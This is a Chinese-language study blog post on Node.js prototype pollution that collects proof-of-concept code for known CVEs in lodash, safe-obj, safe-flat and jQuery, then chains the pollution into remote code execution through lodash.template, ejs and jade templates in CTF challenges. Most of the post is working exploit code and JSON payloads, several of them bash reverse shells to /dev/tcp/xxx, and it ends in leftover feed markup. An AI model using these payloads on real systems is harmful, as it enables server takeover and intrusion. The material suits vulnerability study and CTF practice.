<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">merge</span>(<span class="params">paste,data</span>)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> key <span class="keyword">in</span> data)&#123;</span><br><span class="line">        <span class="keyword">if</span>(key <span class="keyword">in</span> paste &amp;&amp; key <span class="keyword">in</span> data)&#123;</span><br><span class="line">            <span class="title function_">merge</span>(paste[key],data[key])</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">           paste[key] = data[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> polluted_object = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="string">&#x27;&#123;&quot;__proto__&quot; : &#123;&quot;ewoji&quot; : &quot;U have been polluted!&quot;&#125;&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> pure_object = &#123;</span><br><span class="line">    ewojii : <span class="number">567</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> other_object = &#123;</span><br><span class="line">    what : <span class="number">222</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">merge</span>(pure_object,polluted_object)</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(other_object.<span class="property">ewoji</span>)</span><br></pre></td></tr></table></figure>

<p><img   src="/../img/$%7Bfiilename%7D/image-20240714172503630.png"  alt="image-20240714172503630"></p>
<p>自此，所有的对象都被ewoji属性污染了</p>
<h1 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h1><p>Nodejs原型链污染漏洞是基于白盒测试才能挖掘出的漏洞，一般出现在Nodejs的一些模块中，下面以loadash，safe-obj，safe-flat，jQuery为例</p>
<h2 id="Lodash"><a href="#Lodash" class="headerlink" title="Lodash"></a>Lodash</h2><p>Lodash 是一个 JavaScript 库，包含简化字符串、数字、数组、函数和对象编程的工具，可以帮助程序员更有效地编写和维护 JavaScript 代码。并且是一个流行的 npm 库，仅在GitHub 上就有超过 400 万个项目使用，Lodash的普及率非常高，每月的下载量超过 8000 万次。但是这个库中有几个严重的原型污染漏洞。</p>
<p><a class="link"   href="https://www.lodashjs.com/" >Lodash 简介 | Lodash中文文档 | Lodash中文网 (lodashjs.com)<i class="fas fa-external-link-alt"></i></a></p>
<h3 id="lodash-defaultsDeep（CVE-2019-10744）"><a href="#lodash-defaultsDeep（CVE-2019-10744）" class="headerlink" title="lodash.defaultsDeep（CVE-2019-10744）"></a>lodash.defaultsDeep（CVE-2019-10744）</h3><p><strong>影响版本4.17.11及更低版本</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm i -g npm</span><br><span class="line">npm i --save lodash@4.17.11</span><br></pre></td></tr></table></figure>

<p>官方验证poc</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> mergeFn = <span class="built_in">require</span>(<span class="string">&#x27;lodash&#x27;</span>).<span class="property">defaultsDeep</span>;</span><br><span class="line"><span class="keyword">const</span> payload = <span class="string">&#x27;&#123;&quot;constructor&quot;: &#123;&quot;prototype&quot;: &#123;&quot;whoami&quot;: &quot;Vulnerable&quot;&#125;&#125;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">check</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title function_">mergeFn</span>(&#123;&#125;, <span class="title class_">JSON</span>.<span class="title function_">parse</span>(payload));</span><br><span class="line">    <span class="keyword">if</span> ((&#123;&#125;)[<span class="string">`a0`</span>] === <span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Vulnerable to Prototype Pollution via <span class="subst">$&#123;payload&#125;</span>`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">check</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>)<span class="comment">//[Object: null prototype] &#123; whoami: &#x27;Vulnerable&#x27; &#125;</span></span><br></pre></td></tr></table></figure>

<p>打个断点跟进，跳过一些参数的处理和类型的判断</p>
<p>首先来到<strong>baseMerge()</strong></p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240714235913147.png"  alt="image-20240714235913147"></p>
<p>object：{}，source：payload，接着跟进</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240715000800239.png"  alt="image-20240715000800239"></p>
<p>其中的**baseFor()<strong>用于获取键值，</strong>customizer()<strong>负责统一和准备每次取的键和值是,最后用</strong>assignMergeValue()**将值赋予object</p>
<p>第一步获取所有键值，这步判断没看懂，总之如果键值有<strong>constructor</strong>的话就可以过，最后result数组包含所有键值</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240715001605873.png"  alt="image-20240715001605873"></p>
<p>如果取的值是object的话会进行用**baseMergeDeep()**，没什么影响</p>
<p>进入取值赋值环节，首先是把键取出来，这里的key进行了验证，不能等于___proto___(莫非这个cve是一个绕过的漏洞，既然有对proto的验证)</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240715002233349.png"  alt="image-20240715002233349"></p>
<p>接着赋值，又对键做了一次验证</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240715002426119.png"  alt="image-20240715002426119"></p>
<p>再反复，直到合并完object为止，就完成了污染</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> payload = <span class="string">&#x27;&#123;&quot;constructor&quot;: &#123;&quot;prototype&quot;: &#123;&quot;whoami&quot;: &quot;Vulnerable&quot;&#125;&#125;&#125;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>POC给的constructor.prototype实际上等价于__proto__，所以绕过了验证</p>
<h3 id="lodash-merge"><a href="#lodash-merge" class="headerlink" title="lodash.merge"></a>lodash.merge</h3><p>我不审了，我要做POC小子</p>
<p><strong>版本4.17.4</strong></p>
<p>POC</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> lodash= <span class="built_in">require</span>(<span class="string">&#x27;lodash&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> payload = <span class="string">&#x27;&#123;&quot;__proto__&quot;:&#123;&quot;whoami&quot;:&quot;Vulnerable&quot;&#125;&#125;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a = &#123;&#125;;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Before whoami: &quot;</span> + a.<span class="property">whoami</span>);</span><br><span class="line">lodash.<span class="title function_">merge</span>(&#123;&#125;, <span class="title class_">JSON</span>.<span class="title function_">parse</span>(payload));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;After whoami: &quot;</span> + a.<span class="property">whoami</span>);</span><br></pre></td></tr></table></figure>

<h3 id="lodash-mergeWith"><a href="#lodash-mergeWith" class="headerlink" title="lodash.mergeWith"></a>lodash.mergeWith</h3><p><strong>版本4.17.4</strong></p>
<p>POC</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> lodash= <span class="built_in">require</span>(<span class="string">&#x27;lodash&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> payload = <span class="string">&#x27;&#123;&quot;__proto__&quot;:&#123;&quot;whoami&quot;:&quot;Vulnerable&quot;&#125;&#125;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a = &#123;&#125;;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Before whoami: &quot;</span> + a.<span class="property">whoami</span>);</span><br><span class="line">lodash.<span class="title function_">mergeWith</span>(&#123;&#125;, <span class="title class_">JSON</span>.<span class="title function_">parse</span>(payload));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;After whoami: &quot;</span> + a.<span class="property">whoami</span>);</span><br></pre></td></tr></table></figure>

<h3 id="lodash-set"><a href="#lodash-set" class="headerlink" title="lodash.set"></a>lodash.set</h3><p><strong>版本4.17.4</strong></p>
<p>POC</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> lodash= <span class="built_in">require</span>(<span class="string">&#x27;lodash&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> object_1 = &#123; <span class="string">&#x27;a&#x27;</span>: [&#123; <span class="string">&#x27;b&#x27;</span>: &#123; <span class="string">&#x27;c&#x27;</span>: <span class="number">3</span> &#125; &#125;] &#125;;</span><br><span class="line"><span class="keyword">var</span> object_2 = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(object_1.<span class="property">whoami</span>);</span><br><span class="line"><span class="comment">//lodash.set(object_2, &#x27;object_2[&quot;__proto__&quot;][&quot;whoami&quot;]&#x27;, &#x27;Vulnerable&#x27;);</span></span><br><span class="line">lodash.<span class="title function_">set</span>(object_2, <span class="string">&#x27;__proto__.[&quot;whoami&quot;]&#x27;</span>, <span class="string">&#x27;Vulnerable&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(object_1.<span class="property">whoami</span>);</span><br></pre></td></tr></table></figure>

<h3 id="lodash-setWith"><a href="#lodash-setWith" class="headerlink" title="lodash.setWith"></a>lodash.setWith</h3><p><strong>版本4.17.4</strong></p>
<p>POC</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> lodash= <span class="built_in">require</span>(<span class="string">&#x27;lodash&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> object_1 = &#123; <span class="string">&#x27;a&#x27;</span>: [&#123; <span class="string">&#x27;b&#x27;</span>: &#123; <span class="string">&#x27;c&#x27;</span>: <span class="number">3</span> &#125; &#125;] &#125;;</span><br><span class="line"><span class="keyword">var</span> object_2 = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(object_1.<span class="property">whoami</span>);</span><br><span class="line"><span class="comment">//lodash.setWith(object_2, &#x27;object_2[&quot;__proto__&quot;][&quot;whoami&quot;]&#x27;, &#x27;Vulnerable&#x27;);</span></span><br><span class="line">lodash.<span class="title function_">setWith</span>(object_2, <span class="string">&#x27;__proto__.[&quot;whoami&quot;]&#x27;</span>, <span class="string">&#x27;Vulnerable&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(object_1.<span class="property">whoami</span>);</span><br></pre></td></tr></table></figure>

<h3 id="lodash-zipObjectDeep-CVE-2020-8203"><a href="#lodash-zipObjectDeep-CVE-2020-8203" class="headerlink" title="lodash.zipObjectDeep(CVE-2020-8203)"></a>lodash.zipObjectDeep(CVE-2020-8203)</h3><p><strong>4.17.16之前</strong></p>
<p>POC</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> _ = <span class="built_in">require</span>(<span class="string">&#x27;lodash&#x27;</span>);</span><br><span class="line"></span><br><span class="line">_.<span class="title function_">zipObjectDeep</span>([<span class="string">&#x27;__proto__.z&#x27;</span>],[<span class="number">123</span>])</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(z) <span class="comment">// 123</span></span><br></pre></td></tr></table></figure>



<h2 id="Safe-obj"><a href="#Safe-obj" class="headerlink" title="Safe-obj"></a>Safe-obj</h2><h3 id="CVE-2021-25928"><a href="#CVE-2021-25928" class="headerlink" title="CVE-2021-25928"></a>CVE-2021-25928</h3><p><strong>版本1.0.0到1.0.2</strong></p>
<p>POC</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> safeObj = <span class="built_in">require</span>(<span class="string">&quot;safe-obj&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> obj = &#123;&#125;;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Before : &quot;</span> + &#123;&#125;.<span class="property">polluted</span>);</span><br><span class="line">safeObj. expand (obj,<span class="string">&#x27;__proto__.polluted&#x27;</span>,<span class="string">&#x27;Yes! Its Polluted&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;After : &quot;</span> + &#123;&#125;.<span class="property">polluted</span>);</span><br></pre></td></tr></table></figure>

<h2 id="Safe-flat"><a href="#Safe-flat" class="headerlink" title="Safe-flat"></a>Safe-flat</h2><h3 id="CVE-2021-25927"><a href="#CVE-2021-25927" class="headerlink" title="CVE-2021-25927"></a>CVE-2021-25927</h3><p>POC</p>
<p><strong>版本v2.0.0~v2.0.1</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> safeFlat = <span class="built_in">require</span>(<span class="string">&quot;safe-flat&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Before : &quot;</span> + &#123;&#125;.<span class="property">polluted</span>);</span><br><span class="line">safeFlat.<span class="title function_">unflatten</span>(&#123;<span class="string">&quot;__proto__.polluted&quot;</span>: <span class="string">&quot;Yes! Its Polluted&quot;</span>&#125;, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;After : &quot;</span> + &#123;&#125;.<span class="property">polluted</span>);</span><br></pre></td></tr></table></figure>

<h2 id="jQuery"><a href="#jQuery" class="headerlink" title="jQuery"></a>jQuery</h2><h3 id="CVE-2019-11358"><a href="#CVE-2019-11358" class="headerlink" title="CVE-2019-11358"></a>CVE-2019-11358</h3><p><strong>3.4.0版本之前</strong></p>
<p>POC</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$.<span class="title function_">extend</span>(<span class="literal">true</span>, &#123;&#125;, <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="string">&#x27;&#123;&quot;__proto__&quot;: &#123;&quot;z&quot;: 123&#125;&#125;&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(z); <span class="comment">// 123</span></span><br></pre></td></tr></table></figure>



<h2 id="配合原型链污染的rce方法"><a href="#配合原型链污染的rce方法" class="headerlink" title="配合原型链污染的rce方法"></a>配合原型链污染的rce方法</h2><h3 id="配合-lodash-template-实现-RCE"><a href="#配合-lodash-template-实现-RCE" class="headerlink" title="配合 lodash.template 实现 RCE"></a>配合 lodash.template 实现 RCE</h3><p><em><strong>[Code-Breaking 2018]Thejs</strong></em></p>
<p>环境地址：</p>
<p><a class="link"   href="https://github.com/phith0n/code-breaking/tree/master/2018/thejs/web" >code-breaking&#x2F;2018&#x2F;thejs&#x2F;web at master · phith0n&#x2F;code-breaking (github.com)<i class="fas fa-external-link-alt"></i></a></p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240715130934569.png"  alt="image-20240715130934569"></p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240715131557236.png"  alt="image-20240715131557236"></p>
<p>用户提交的<strong>language</strong>和<strong>categories</strong>会被**loadash.merge()**合并到session中</p>
<p>而用户提交的对象可控，可以完成原型链污染</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240715132001364.png"  alt="image-20240715132001364"></p>
<p>最后的利用点就是在**lodash.template()**上，页面最终会通过这个函数渲染再呈现</p>
<p><strong>lodash&#x2F;template.js</strong>触发点</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Use a sourceURL for easier debugging.</span></span><br><span class="line"><span class="keyword">var</span> sourceURL = <span class="string">&#x27;sourceURL&#x27;</span> <span class="keyword">in</span> options ? <span class="string">&#x27;//# sourceURL=&#x27;</span> + options.<span class="property">sourceURL</span> + <span class="string">&#x27;\n&#x27;</span> : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">var</span> result = <span class="title function_">attempt</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="title class_">Function</span>(importsKeys, sourceURL + <span class="string">&#x27;return &#x27;</span> + source)</span><br><span class="line">  .<span class="title function_">apply</span>(<span class="literal">undefined</span>, importsValues);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>首先<strong>sourceURL</strong>检测是否在options中，如果在，则赋值，不在为空</p>
<p>而options默认没有<strong>sourceURL</strong>属性，所以如果我们污染了<strong>object</strong>使他有<strong>sourceURL</strong>属性就可以成功污染这里的<strong>souceURL</strong>的值</p>
<p>接着下面用**Function()**动态创建了一个函数（options无sourceURL属性）</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240715171858801.png"  alt="image-20240715171858801"></p>
<p>接着就到了rce环节了</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240715175534367.png"  alt="image-20240715175534367"></p>
<p>参数<strong>importsKeys</strong>没用不管它，函数体是<strong>sourceURL+’return’+source</strong></p>
<p>相关知识链接：<a class="link"   href="https://www.runoob.com/w3cnote/js-call-apply-bind.html" >JavaScript 中 call()、apply()、bind() 的用法 | 菜鸟教程 (runoob.com)<i class="fas fa-external-link-alt"></i></a></p>
<p>跟进apply，这里进行模版处理</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240715224657731.png"  alt="image-20240715224657731"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//# sourceURL=</span><br><span class="line">return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;calc&#x27;)</span><br><span class="line">这上面实际上就是sourceURL，所以要想它正确执行return，必须用换行绕过</span><br><span class="line">下面的就是source</span><br></pre></td></tr></table></figure>

<p><a class="link"   href="https://xz.aliyun.com/t/11859?time__1311=Cq0xuD0DnDRAqGNeeeuGrrQeY5PyqAI3x" >NodeJS VM和VM2沙箱逃逸 - 先知社区 (aliyun.com)<i class="fas fa-external-link-alt"></i></a></p>
<p>本地测试通过，抓包改包即可</p>
<p>POC</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.1.6:3000</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://192.168.1.6:3000/</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://192.168.1.6:3000</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>40</span><br><span class="line"></span><br><span class="line"><span class="language-swift">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;sourceURL&quot;</span>:<span class="string">&quot;<span class="subst">\r</span><span class="subst">\n</span>return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;calc&#x27;)&quot;</span>&#125;&#125;</span></span><br></pre></td></tr></table></figure>

<p><img   src="/../img/$%7Bfiilename%7D/image-20240715223457493.png"  alt="image-20240715223457493"></p>
<h3 id="配合-ejs-模板引擎实现-RCE"><a href="#配合-ejs-模板引擎实现-RCE" class="headerlink" title="配合 ejs 模板引擎实现 RCE"></a>配合 ejs 模板引擎实现 RCE</h3><h4 id="基本结构"><a href="#基本结构" class="headerlink" title="基本结构"></a>基本结构</h4><p>app.js</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> lodash = <span class="built_in">require</span>(<span class="string">&#x27;lodash&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> ejs = <span class="built_in">require</span>(<span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="comment">//设置模板的位置与种类</span></span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;views&#x27;</span>, __dirname);</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;views engine&#x27;</span>,<span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//对原型进行污染</span></span><br><span class="line"><span class="keyword">var</span> malicious_payload = <span class="string">&#x27;&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(\&#x27;child_process\&#x27;).exec(\&#x27;calc\&#x27;);var __tmp2&quot;&#125;&#125;&#x27;</span>;</span><br><span class="line">lodash.<span class="title function_">merge</span>(&#123;&#125;, <span class="title class_">JSON</span>.<span class="title function_">parse</span>(malicious_payload));</span><br><span class="line"></span><br><span class="line"><span class="comment">//进行渲染</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">    res.<span class="property">render</span> (<span class="string">&quot;index.ejs&quot;</span>,&#123;</span><br><span class="line">        <span class="attr">message</span>: <span class="string">&#x27;whoami test&#x27;</span></span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//设置http</span></span><br><span class="line"><span class="keyword">var</span> server = app.<span class="title function_">listen</span>(<span class="number">8000</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> host = server.<span class="title function_">address</span>().<span class="property">address</span></span><br><span class="line">    <span class="keyword">var</span> port = server.<span class="title function_">address</span>().<span class="property">port</span></span><br><span class="line"></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;应用实例，访问地址为 http://%s:%s&quot;</span>, host, port)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>index.ejs</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;!<span class="variable constant_">DOCTYPE</span> html&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>&lt;%= message%&gt;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>利用过程太长了，跟着走了一遍眼睛都疼了</p>
<p>我要做POC小子</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;outputFunctionName&quot;</span>:<span class="string">&quot;_tmp1;global.process.mainModule.require(\&#x27;child_process\&#x27;).execSync(&#x27;calc&#x27;);var __tmp2&quot;</span>&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;outputFunctionName&quot;</span>:<span class="string">&quot;_tmp1;global.process.mainModule.require(\&#x27;child_process\&#x27;).exec(&#x27;calc&#x27;);var __tmp2&quot;</span>&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;outputFunctionName&quot;</span>:<span class="string">&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/xxx/6666 0&gt;&amp;1\&quot;&#x27;);var __tmp2&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ctfshow-341"><a href="#ctfshow-341" class="headerlink" title="ctfshow-341"></a>ctfshow-341</h4><p>找到两个触发点，一个是ejs的render和原型链污染点即可</p>
<h5 id="原型链污染点utils-copy"><a href="#原型链污染点utils-copy" class="headerlink" title="原型链污染点utils.copy()"></a>原型链污染点<strong>utils.copy()</strong></h5><p><img   src="/../img/$%7Bfiilename%7D/image-20240716225924733.png"  alt="image-20240716225924733"></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">copy</span>(<span class="params">object1, object2</span>)&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> object2) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> object2 &amp;&amp; key <span class="keyword">in</span> object1) &#123;</span><br><span class="line">            <span class="title function_">copy</span>(object1[key], object2[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            object1[key] = object2[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>这太经典了无需多言</p>
<h5 id="render触发点"><a href="#render触发点" class="headerlink" title="render触发点"></a>render触发点</h5><p><img   src="/../img/$%7Bfiilename%7D/image-20240716231451160.png"  alt="image-20240716231451160"></p>
<p>那就很ez了，req.body可控，传入payload即可rce，要注意这里的user.userinfo的构造函数是<strong>Function</strong>，所以构造函数的原型对象即**user.userinfo._<em>proto_</em><strong>等于</strong>{}<strong>，而</strong>{}._<em>proto</em>_**才是我们需要污染的，所以需要套两层</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/xxx/4567 0&gt;&amp;1\&quot;&#x27;);var __tmp2&quot;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="配合jade模版引擎实现RCE"><a href="#配合jade模版引擎实现RCE" class="headerlink" title="配合jade模版引擎实现RCE"></a>配合jade模版引擎实现RCE</h3><p>其实jade模板引擎跟ejs主要区别就是在进入**compile()<strong>函数之后还进入了</strong>parse()**函数</p>
<p>所以payload稍稍不一样</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;compileDebug&quot;</span>:<span class="number">1</span>,<span class="string">&quot;self&quot;</span>:<span class="number">1</span>,<span class="string">&quot;line&quot;</span>:<span class="string">&quot;console.log(global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;calc&#x27;))&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ctfshow-342-343"><a href="#ctfshow-342-343" class="headerlink" title="ctfshow-342,343"></a>ctfshow-342,343</h4><p>思路与ejs一模一样，换个payload即可</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;__proto__&quot;</span>: &#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;Block&quot;</span>,<span class="string">&quot;nodes&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;compileDebug&quot;</span>:<span class="number">1</span>,<span class="string">&quot;self&quot;</span>:<span class="number">1</span>,<span class="string">&quot;line&quot;</span>:<span class="string">&quot;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/xxx/810&gt;&amp;1\&quot;&#x27;)&quot;</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>技术探索</category>
      </categories>
      <tags>
        <tag>Nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title>XXE漏洞学习</title>
